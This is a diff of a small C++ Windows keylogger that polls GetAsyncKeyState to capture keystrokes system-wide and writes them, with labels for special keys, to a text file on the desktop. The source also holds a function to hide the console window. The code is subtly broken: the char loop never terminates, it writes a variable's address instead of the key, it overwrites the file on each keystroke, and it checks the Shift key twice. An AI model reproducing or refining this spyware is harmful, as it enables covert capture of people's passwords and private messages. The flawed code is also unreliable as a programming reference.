@@ -1,59 +1,54 @@
-#define _CRT_NONSTDC_NO_DEPRECATE
+#define PATH "C:\\Users\\Tal\\Desktop\\KeyLogger_OUTFILE.txt"  // path to log folder location
 #include <iostream>
 #include <Windows.h>
 #include <time.h>
 #include <fstream>
-#include <conio.h>
 void hideConsole();
 void showConsole();
-void capture_key();
+void saveToFile(int key_ascii);
 
 int main()
 {
-	//hideConsole();
 	showConsole();
-	std::ofstream log;
-	log.open("C:\\Users\\Tal\\Desktop\\Log.txt");
-	if (log.fail())
-	{
-		exit(0);
-	}
 	while (true)
 	{
-		Sleep(50);
-		capture_key();
+		Sleep(20); 
+		for (char i = 8; i <= 255; i++)
+			if (GetAsyncKeyState(i) == -32767) // catch keystrokes
+				saveToFile(i);
 	}
 }
 
-void capture_key()
+void saveToFile(int key_ascii)
 {
-	std::ofstream log;
-	log.open("C:\\Users\\Tal\\Desktop\\Log.txt");
-	char key;
-	key = getch();
-	switch ((int)key)
+	Sleep(20);
+	std::ofstream OUTPUT_FILE;
+	OUTPUT_FILE.open(PATH);
+	if (OUTPUT_FILE.fail())
 	{
-	case 27: // leave when pressed Escape key
-		exit(1);
-
-	case ' ': // Space key
-		log << " ";
-		break;
-	
-	case 0x0D: // Enter key
-		log << "[ENTER]";
-		break;
-	
-	case 0x08: // Backspace key
-		log << "[BACKSPACE]";
-		break;
-
-	case 0x09: // Tab key
-		log << "[TAB]";
-		break;
-	default:
-		log << key;
+		showConsole();
+		std::cout << "Error: cannot open file " << PATH;
 	}
+		
+	else if (key_ascii == VK_ESCAPE)
+		exit(1);
+	else if (key_ascii == VK_SHIFT)
+		OUTPUT_FILE << "[SHIFT]";
+	else if (key_ascii == VK_RETURN)
+		OUTPUT_FILE << "[ENTER]";
+	else if (key_ascii == VK_SPACE)
+		OUTPUT_FILE << "[SPACE]";
+	else if (key_ascii == VK_TAB)
+		OUTPUT_FILE << "[TAB]";
+	else if (key_ascii == VK_DELETE)
+		OUTPUT_FILE << "[DELETE]";
+	else if (key_ascii == VK_BACK)
+		OUTPUT_FILE << "[BACKSPACE]";
+	else if (key_ascii == VK_SHIFT)
+		OUTPUT_FILE << "[SHIFT]";
+	else
+		OUTPUT_FILE << (char)&key_ascii;
+	OUTPUT_FILE.close();
 }
 
 void hideConsole()
